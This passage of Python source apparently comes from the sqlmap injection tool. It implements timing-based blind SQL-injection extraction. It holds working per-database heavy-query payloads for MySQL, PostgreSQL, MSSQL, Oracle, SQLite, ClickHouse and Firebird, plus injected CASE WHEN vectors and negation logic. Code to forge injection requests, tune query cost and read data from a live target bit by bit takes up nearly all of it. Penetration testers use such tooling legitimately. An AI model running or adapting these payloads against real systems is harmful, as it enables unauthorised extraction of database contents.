# So the rule is simply: pick the strongest per-DBMS bounded primitive; if a target hoists/folds it to a
# sub-threshold delta, it safely falls back. Keyed on DBMS.* so forks resolve via their base DBMS
# (MariaDB/TiDB->MySQL, CockroachDB->PostgreSQL).
_LH_MYSQL = "(SELECT BENCHMARK([COST],MD5(1)))"                                                              # MySQL/MariaDB: CPU burn, O(1) memory (TiDB hoists -> safe fallback)
# MSSQL/Sybase: the sysusers cross-join is exactly the shipped heavy-query primitive (time_blind.xml), just
# bounded by TOP so the cost ladder means something and the work stays capped. A literal TOP keeps it valid
# on Sybase ASE too (which takes no expression there). Deliberately NOT HASHBYTES: SQL Server 2014 and older
# cap its input at 8000 bytes regardless of VARCHAR(MAX), so every rung of the ladder would error.
_LH_MSSQL = "(SELECT COUNT(*) FROM (SELECT TOP [COST] 1 AS qx FROM sysusers AS q1,sysusers AS q2,sysusers AS q3,sysusers AS q4,sysusers AS q5,sysusers AS q6,sysusers AS q7) AS qt)"

LIGHT_HEAVY = {
    DBMS.PGSQL: "(SELECT COUNT(*) FROM GENERATE_SERIES(1,[COST]))",                                          # PG materialises the series
    DBMS.MYSQL: _LH_MYSQL,
    DBMS.MSSQL: _LH_MSSQL,
    DBMS.SYBASE: _LH_MSSQL,
    DBMS.ORACLE: "(SELECT COUNT(*) FROM DUAL CONNECT BY LEVEL<=[COST])",
    # recursive CTE - rows depend on the previous, so the engine must produce them one by one (never folded)
    DBMS.SQLITE: "(SELECT COUNT(*) FROM (WITH RECURSIVE _c(_x) AS (SELECT 1 UNION ALL SELECT _x+1 FROM _c LIMIT [COST]) SELECT _x FROM _c))",
    # ClickHouse ships a time-based payload; a plain COUNT folds (columnar) so force a per-row hash
    DBMS.CLICKHOUSE: "(SELECT COUNT(*) FROM numbers([COST]) WHERE MD5(toString(number))='zz')",
    # Firebird best-effort: no generator, recursion<=1024, strings<=32 KB -> system-catalog cross-join, bounded
    # by FIRST (a literal, which Firebird accepts) so the rungs of the cost ladder actually differ in work.
    # NOTE the plain aliases: Firebird rejects an unquoted identifier starting with '_', and because a
    # syntax error here costs the same time as a cheap query it looks exactly like a folded primitive -
    # measured live, 'AS _x'/'_t' returned in 0.59 s at every cost while 'AS qx'/'qt' scaled 0.78 -> 3.0 s.
    DBMS.FIREBIRD: "(SELECT COUNT(*) FROM (SELECT FIRST [COST] 1 AS qx FROM RDB$RELATIONS a, RDB$RELATIONS b, RDB$RELATIONS c, RDB$RELATIONS d) qt)",
    # NOTE: DB2/Informix/HSQLDB/SAP MaxDB ship time-based payloads but have no validated light-heavy here ->
    # no entry -> they gracefully fall back to classic time-based (SLEEP/heavy-query) extraction.
}

# Ascending cost ladder tuneHeavy walks ([COST] = generator rows / recursion depth / BENCHMARK iterations /
# string length). It escalates until the MEASURED server-side heavy delta is >= MIN_HEAVY_MS (a real time
# margin so bits don't flip under extraction load) AND the response-order calibrates reliably. The same
# [COST] costs very different time per primitive (a generator row << a BENCHMARK MD5 iteration), so the
# ladder is walked by measured time, not a fixed floor - each engine lands on whatever rung first clears the
# margin. The low rungs let CPU-dense primitives land near 20-60 ms instead of overshooting. Top is 4M so
# string primitives allocate at most ~4 MB (memory-safe, no spill/DoS). If even 4M can't reach MIN_HEAVY_MS
# reliably the target is too noisy/fast-to-read -> fall back to classic. Correctness beats ms - a flip means
# re-extract.
LIGHT_HEAVY_COSTS = (20000, 60000, 200000, 600000, 2000000, 4000000)
MIN_HEAVY_MS = 15.0    # required server-side heavy delta; ~15 ms clears realistic multi-hop extraction-load jitter
# The heavy/cheap PAIR separation must also be >= this fraction of the base (cheap) pair time - an absolute
# floor alone is marginal on a slow multi-hop path (a 15 ms margin on a ~50 ms base flips ~10% of bits under
# load); requiring a relative margin makes such a target climb to a robustly-separated cost. See tuneHeavy.
MIN_SEPARATION_FRAC = 0.5

# DBMSes whose primitive is a bounded GENERATOR whose row count sits in the [COST] slot. For these the bit
# gates the WORK AMOUNT (the count) rather than selecting between a heavy and a cheap CASE branch. This is
# what makes the oracle survive optimisers that DECORRELATE/HOIST an uncorrelated scalar subquery out of a
# CASE and run it in BOTH branches (observed on CockroachDB with GENERATE_SERIES for a non-foldable
# condition - the false branch still materialised the full series, so cond and neg were BOTH heavy and the
# response order was a coin flip -> corruption). With the count itself computed from the bit
# (GENERATE_SERIES(1, CASE WHEN cond THEN [COST] ELSE 1)) there is no constant subquery to hoist: the engine
# must evaluate the CASE first and only then generate that many rows, so exactly one of cond/neg does the
# work. CONNECT BY LEVEL<=expr and LIMIT expr are standard, so Oracle/SQLite use the same form. Validated
# end-to-end on CockroachDB (was corrupting, now reads 1.00) and PostgreSQL (still engages, unchanged).
_GATED_COST = frozenset((DBMS.PGSQL, DBMS.ORACLE, DBMS.SQLITE))


# Inert SQL-comment sentinels bracketing the injected comparison inside the heavy vector. They let the
# oracle build the exact NEGATED payload (heavy-iff-false) from the forged condition payload by a single
# regex - enabling the SYMMETRIC oracle (condition vs its negation, exactly one runs heavy, 1 pair reads
# the bit both ways) without any change to bisection. Comments are ignored by the DBMS parser.
INFERENCE_BEGIN = "/*tlb*/"
INFERENCE_END = "/*tle*/"


def lightHeavyVector(dbms, cost):
    """Return the timeless rung-2 vector for `dbms` doing ~`cost` units of bounded work (or None if no
    primitive is defined). The INFERENCE slot is bracketed with sentinels so negatePayload() can derive the
    mirror for the symmetric oracle (condition vs its negation, exactly one runs heavy).

    Two gating shapes, both flowing through the exact same payload machinery:
      - GENERATOR primitives (see _GATED_COST): the bit is placed INSIDE the row-count bound
        (GENERATE_SERIES(1, CASE WHEN cond THEN [COST] ELSE 1)), so there is no constant subquery for an
        optimiser to hoist out of a CASE and run in both branches - the count itself depends on the bit.
      - Everything else: the classic '[RANDNUM]=(CASE WHEN cond THEN <heavy> ELSE [RANDNUM])' branch, used
        where the cost slot must stay constant (MySQL BENCHMARK) or there is no numeric cost (Firebird);
        these engines were validated not to hoist.
    Either way tuneHeavy's MIN_HEAVY_MS gate + faithful (uncorrelated) calibration mean a target that still
    manages an unreadable delta simply fails calibration and falls back to classic - never corrupts."""
    primitive = LIGHT_HEAVY.get(dbms)
    if not primitive:
        return None
    if dbms in _GATED_COST:
        gate = "(CASE WHEN (%s[INFERENCE]%s) THEN %d ELSE 1 END)" % (INFERENCE_BEGIN, INFERENCE_END, int(cost))
        heavy = primitive.replace("[COST]", gate)
        return "AND [RANDNUM]<%s" % heavy
    heavy = primitive.replace("[COST]", str(int(cost)))
    return "AND [RANDNUM]=(CASE WHEN (%s[INFERENCE]%s) THEN (%s) ELSE [RANDNUM] END)" % (INFERENCE_BEGIN, INFERENCE_END, heavy)


def negatePayload(value):
    """Return `value` with the sentinel-bracketed comparison replaced by a NULL-SAFE negation, or None if
    no sentinel pair is present (a non-timeless vector). Used to build the symmetric oracle's negated
    request (the request whose heavy branch must run iff the condition does NOT hold).

    The negation is `(CASE WHEN (cond) THEN 1 ELSE 0 END)=0`, which is TRUE iff `cond` is false OR NULL -
    NOT plain `NOT(cond)`. This is the end-of-string fix: past the end of a string the comparison
    (ASCII(SUBSTR(...))>n) is NULL, and `NOT(NULL)` is NULL, so with plain NOT NEITHER the condition nor
    its negation forces the heavy branch - both requests stay cheap and the response order is left to
    secondary noise (measured ~0.6 cond-last on Oracle, not a clean coin flip), which invents phantom
    trailing characters. With the CASE form the negation's ELSE catches NULL, so at end-of-string the
    NEGATION request runs heavy and the condition request stays cheap: the condition finishes first every
    vote (fraction ~0), read as False, and the string terminates cleanly. CASE + integer '=0' is portable
    across every DBMS (unlike `IS NOT TRUE`)."""
    import re

    # DOTALL: a comparison can legitimately span lines (a tamper script inserting newlines for whitespace,
    # a multi-line injected value); without it the sentinels would not match and the bit would be read on a
    # path that never negates the condition.
    pattern = re.compile(r"%s(.*?)%s" % (re.escape(INFERENCE_BEGIN), re.escape(INFERENCE_END)), re.DOTALL)
    if not pattern.search(value or ""):
        return None
    return pattern.sub(lambda m: "%s(CASE WHEN (%s) THEN 1 ELSE 0 END)=0%s" % (INFERENCE_BEGIN, m.group(1), INFERENCE_END), value)


def negateCondition(condition):
    """The NULL-SAFE negation of a bare `condition` (no sentinels involved) - the same CASE form
    negatePayload() splices in, so both paths terminate a string identically. See negatePayload()."""
    return "(CASE WHEN (%s) THEN 1 ELSE 0 END)=0" % condition


def _pairMs(conn, reqA, reqB, samples=5, timeout=30):
    """Median wall-clock of the coalesced PAIR (reqA, reqB) until BOTH streams finish - tracks the heavy
    branch when one is heavy, bare round-trip when none. Used for the reliability/separation gate that
    decides which cost to engage at (see tuneHeavy)."""
    ts = []
    for _ in range(samples):
        s = time.time()
        _pairOrder(conn, reqA, reqB, timeout)
        ts.append((time.time() - s) * 1000.0)
    return sorted(ts)[samples // 2]


def _calibrationConditions(dbms):
    """Return (trueCond, falseCond): a KNOWN-true and KNOWN-false boolean of the SAME shape real
    extraction injects - the per-DBMS inference comparison applied to the version banner, i.e. an
    UNCORRELATED, non-constant-foldable predicate (e.g. ASCII(SUBSTRING((VERSION())::text FROM 1 FOR 1))>1
    for true, >255 for false). This matters because some optimisers (CockroachDB, TiDB, ...) HOIST the
    uncorrelated heavy subquery out of the CASE and run it in BOTH branches for such a predicate, while a
    CONSTANT-foldable probe like '1=1'/'1=0' lets them prune the dead branch at plan time - so calibrating
    with the constant sees a clean heavy delta the REAL extraction never has and engages straight into
    corruption (bits become a coin flip). Calibrating with the faithful predicate makes a hoisting target
    measure ~0 server-side delta on every rung, so tuneHeavy's MIN_HEAVY_MS gate rejects it and the scan
    safely falls back to classic time-based.

    Returns (None, None) when the DBMS ships no usable inference/banner template. It deliberately does NOT
    fall back to '1=1'/'1=0': those are precisely the constant-foldable probes this function exists to
    avoid, so a missing template or a formatting mismatch would silently disable the main anti-corruption
    safeguard. No faithful probe means no calibration means no timeless on that DBMS."""
    from lib.core.data import queries

    try:
        entry = queries[dbms]
        template = entry.inference.query      # e.g. 'ASCII(SUBSTRING((%s)::text FROM %d FOR 1))>%d'
        banner = entry.banner.query           # e.g. 'VERSION()' / 'SELECT @@VERSION'
        # int value works for both '>%d' and quoted-char '>%c' templates (chr(1)/chr(255) stay in-range)
        return (template % (banner, 1, 1), template % (banner, 1, 255))
    except Exception:
        return (None, None)


TUNE_DEADLINE_SECS = 300.0   # overall wall-clock budget for the tuning sweep (see tuneHeavy)


def tuneHeavy(conn, dbms=None, trials=50, threshold=0.97, timeout=30, progress=None, loadFactor=1, deadline=None):
    """Walk the cost ladder and return (vector, cost, confidence, status, reqSlow, reqFast) for the LIGHTEST
    rung-2 heavy that is BOTH (a) big enough in absolute server-side time (>= MIN_HEAVY_MS) to survive
    extraction load, and (b) whose response-order signal calibrates as reliable. `status` and the two probe
    requests are handed back so the oracle can re-calibrate every later connection against the same
    known-asymmetric pair and validate every read against the same response status. Returns
    (None, None, best_confidence, None, None, None) if no rung qualifies.

    Requirement (a) is the fix for the fixed-[COST]-means-different-time trap: PostgreSQL generate_series(N)
    and MySQL SHA2(REPEAT('a',N)) at the SAME N differ ~10x in wall time, so a fixed floor that is fine for a
    generator is a ~1-2 ms nothing for a hash - which calibrates fine IDLE (order reliable) then flips bits
    under load. Measuring the real delta and requiring a margin makes the tuning primitive-agnostic and
    load-robust; on a fast single-hop backend the smallest qualifying cost is still tiny.

    The whole sweep is bounded by `deadline` (default TUNE_DEADLINE_SECS from now). The per-socket timeout
    only bounds a single exchange, so an endpoint that answers just fast enough, just slowly enough, could
    otherwise keep tuning alive indefinitely and the scan would never start."""
    from lib.core.common import Backend

    dbms = dbms or Backend.getIdentifiedDbms()
    deadline = deadline if deadline is not None else time.time() + TUNE_DEADLINE_SECS
    # Probe with the faithful (uncorrelated, non-foldable) extraction predicate, NOT constant 1=1/1=0, so a
    # target that hoists the heavy subquery out of the CASE (running it in both branches) is measured with
    # ~0 delta and rejected here instead of engaging into corruption. See _calibrationConditions().
    trueCond, falseCond = _calibrationConditions(dbms)
    if trueCond is None:
        return (None, None, 0.0, None, None, None)
    best = 0.0
    for cost in LIGHT_HEAVY_COSTS:
        if time.time() > deadline:
            break
        vector = lightHeavyVector(dbms, cost)
        if not vector:
            return (None, None, 0.0, None, None, None)
        reqSlow = _forgeRequest(trueCond, conn.host, vector)
        reqFast = _forgeRequest(falseCond, conn.host, vector)
        # Measure the coalesced-PAIR times: a one-heavy pair (reqSlow vs reqFast) and a no-heavy pair
        # (reqFast vs reqFast). Their separation decides whether a real bit's response ORDER is readable
        # (the reliability gate that picks which cost to engage at).
        try:
            heavyPair = _pairMs(conn, reqSlow, reqFast, timeout=timeout)
            cheapPair = _pairMs(conn, reqFast, reqFast, timeout=timeout)
        except Exception:
            heavyPair = cheapPair = 0.0
        separation = heavyPair - cheapPair
        # Reliability gate: the separation must clear an ABSOLUTE floor AND a FRACTION of the base (cheap)
        # pair time. An absolute-only floor is enough on a fast single-hop path (cockroach base ~8 ms, a
        # 16 ms separation is 2x the base) but marginal on a slow multi-hop one: on Oracle the base pair is
        # ~50 ms, so a 15 ms separation is swamped by round-trip jitter under extraction load and ~10% of
        # TRUE bits flip - even though it calibrates clean IDLE. Requiring separation >= a fraction of the
        # base forces such a target to climb to a cost whose margin survives load (Oracle 60k sep 15 ms ->
        # reject -> 200k sep 61 ms -> 0 flips). A fast path is unaffected (its base is tiny).
        # `loadFactor` (= worker thread count) scales the required margin: N value-parallel workers each
        # fire a heavy query, so the server sees ~Nx load during extraction that single-threaded calibration
        # does not, dragging a marginal bit's cond-last fraction into the ambiguous band. Demanding N x the
        # separation here climbs to a cost whose bigger delta keeps the fraction ~1.0 even under that load.
        if separation < MIN_HEAVY_MS * loadFactor or separation < cheapPair * MIN_SEPARATION_FRAC * loadFactor:
            if progress is not None:
                progress()
            continue                         # margin too thin to survive load -> escalate cost
        usable, confidence, status = calibrate(conn, reqSlow, reqFast, trials=trials, threshold=threshold,
                                               timeout=timeout, progress=progress, deadline=deadline)
        best = max(best, confidence)
        if usable:
            return (vector, cost, confidence, status, reqSlow, reqFast)
    return (None, None, best, None, None, None)


def _forgeRequest(inferenceExpr, authority, vector=None):
    """Forge the full HTTP request sqlmap would send for a payload carrying `inferenceExpr` at the
    INFERENCE_MARKER slot of `vector` (default: the current technique's vector), but capture it
    (buildOnly) instead of sending - ready to coalesce. Late placeholders ([RANDNUM]/[SLEEPTIME]/...)
    are filled by agent.payload just like a normal request."""
    from lib.core.agent import agent
    from lib.core.common import getTechniqueData
    from lib.core.settings import INFERENCE_MARKER
    from lib.request.connect import Connect

    vector = vector if vector is not None else getTechniqueData().vector
    forged = agent.suffixQuery(agent.prefixQuery(vector.replace(INFERENCE_MARKER, inferenceExpr)))
    spec = Connect.queryPage(agent.payload(newValue=forged), buildOnly=True)
    return _specToReq(spec, authority)


def readBitLive(conn, condition, vector=None, votes=4, timeout=30):
    """Read one boolean from the LIVE injection point by timeless timing. `condition` is the comparison
    bisection injects (e.g. 'ORD(...)>64'). The condition request carries it at INFERENCE_MARKER, the
    negation request carries its NULL-safe negation; with a heavy-query `vector` exactly one runs the heavy
    work, so response order names the bit - no SLEEP. `vector` defaults to the current technique's vector
    (rung 1, bare boolean natural delta); pass getHeavyVector() for rung 2. Returns True iff condition holds."""
    reqCond = _forgeRequest(condition, conn.host, vector)
    reqNeg = _forgeRequest(negateCondition(condition), conn.host, vector)
    return readBit(conn, reqCond, reqNeg, votes=votes, timeout=timeout)


def restoreClassicValue(value, classicVector):
    """Rebuild the payload `value` - forged from the tuned heavy (sentinel) vector - on top of `classicVector`,
    the time-based vector that was swapped out. Returns None when `value` carries no sentinels.

    Needed on the runtime fallback path: once timeless disengages mid-extraction, the comparison in flight
    was already assembled from the heavy vector, which induces milliseconds rather than '--time-sec'
    seconds. Re-running it as-is through wall-clock comparison would read False no matter the truth, so the
    caller re-forges the SAME comparison onto the restored vector first."""
    import re

    from lib.core.agent import agent
    from lib.core.settings import INFERENCE_MARKER

    match = re.search(r"%s(.*?)%s" % (re.escape(INFERENCE_BEGIN), re.escape(INFERENCE_END)), value or "", re.DOTALL)
    if not match:
        return None
    forged = agent.suffixQuery(agent.prefixQuery(classicVector.replace(INFERENCE_MARKER, match.group(1))))
    return agent.payload(newValue=forged)


def calibrateLive(conn, vector=None, trials=40, threshold=0.9, timeout=30, progress=None):
    """Calibrate the live target using a KNOWN asymmetry: INFERENCE=1=1 runs the heavy branch, INFERENCE=1=0
    stays cheap. On a concurrent backend the heavy request finishes last. Returns (usable, confidence,
    status); below threshold the backend serializes or the delta is unreadable -> do NOT use the oracle.
    Ad-hoc probing only - autoEngage() calibrates with the faithful, non-foldable predicates that
    _calibrationConditions() builds, never with these constants."""
    reqSlow = _forgeRequest("1=1", conn.host, vector)
    reqFast = _forgeRequest("1=0", conn.host, vector)
    return calibrate(conn, reqSlow, reqFast, trials=trials, threshold=threshold, timeout=timeout, progress=progress)


if __name__ == "__main__":
    # End-to-end self-test against a local h2 target that gates query cost on ?bit=/&cap= (scratchpad
    # h2sqlserver.py): calibrate, then read a run of known bits and report accuracy.
    import sys

    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8470
    cap = int(sys.argv[3]) if len(sys.argv) > 3 else 8000

    def req(bit):
        return {"method": "GET", "path": "/sql?bit=%d&cap=%d" % (bit, cap), "authority": host}

    conn = connect(host, port, None, 30)
    usable, confidence, status = calibrate(conn, req(1), req(0), trials=40)
    print("calibrate: usable=%s confidence=%.3f status=%s" % (usable, confidence, status))
    if usable:
        import itertools
        # Read a run of known bits. reqCond carries the actual condition (truth=b -> req(b) runs heavy
        # iff b=1); reqNeg carries the negation (truth=1-b -> req(1-b) runs heavy iff b=0). Exactly one
        # runs heavy, so the pair resolves the bit both ways.
        bits = list(itertools.islice(itertools.cycle([1, 0, 1, 1, 0, 0, 1, 0]), 24))
        ok = 0
        for b in bits:
            got = readBit(conn, req(b), req(1 - b), votes=2, expectStatus=status)
            ok += int(bool(got) == bool(b))
        print("read %d/%d bits correctly" % (ok, len(bits)))
    conn.close()
